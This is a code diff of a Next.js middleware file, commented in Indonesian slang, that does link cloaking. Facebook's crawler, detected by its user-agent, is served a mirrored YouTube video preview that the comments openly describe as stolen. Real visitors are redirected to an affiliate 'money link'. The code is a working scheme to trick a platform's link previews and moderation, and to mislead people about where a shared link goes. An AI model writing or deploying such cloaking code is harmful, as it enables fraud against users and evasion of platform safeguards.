@@ -1,23 +1,23 @@
 import { NextResponse } from 'next/server';
 import type { NextRequest } from 'next/server';
 
-export function middleware(request: NextRequest) {
-  const ua = request.headers.get('user-agent') || '';
+export function middleware(req: NextRequest) {
+  const ua = req.headers.get('user-agent') || '';
   
-  // TETAP LINK OFFER KAMU
-  const linkOffer = "https://link-affiliate-atau-offer-kamu.com";
+  // LINK DUIT LO
+  const linkOffer = "https://link-affiliate-lo.com"; 
+  // LINK TARGET (YouTube/Berita) yang mau dicolong preview-nya
+  const linkTarget = "https://youtu.be/apkf6gfVpiA?si=jKEQXuR9cOGTao8q";
 
-  const isFbBot = ua.includes('facebookexternalhit') || ua.includes('Facebot');
+  const isFb = ua.includes('facebookexternalhit') || ua.includes('Facebot');
 
-  if (isFbBot) {
-    // Bot dilempar ke halaman pancingan untuk baca Meta Tag
-    return NextResponse.rewrite(new URL('/pancingan', request.url));
+  if (isFb) {
+    // Paksa Facebook buat 'ngintip' isi YouTube lewat API Mirror kita
+    return NextResponse.rewrite(new URL(`/api/mirror?target=${encodeURIComponent(linkTarget)}`, req.url));
   }
 
-  // Manusia/User asli langsung ke Link Offer
+  // Orang beneran langsung ke link duit
   return NextResponse.redirect(linkOffer);
 }
 
-export const config = {
-  matcher: '/',
-};
+export const config = { matcher: '/' };
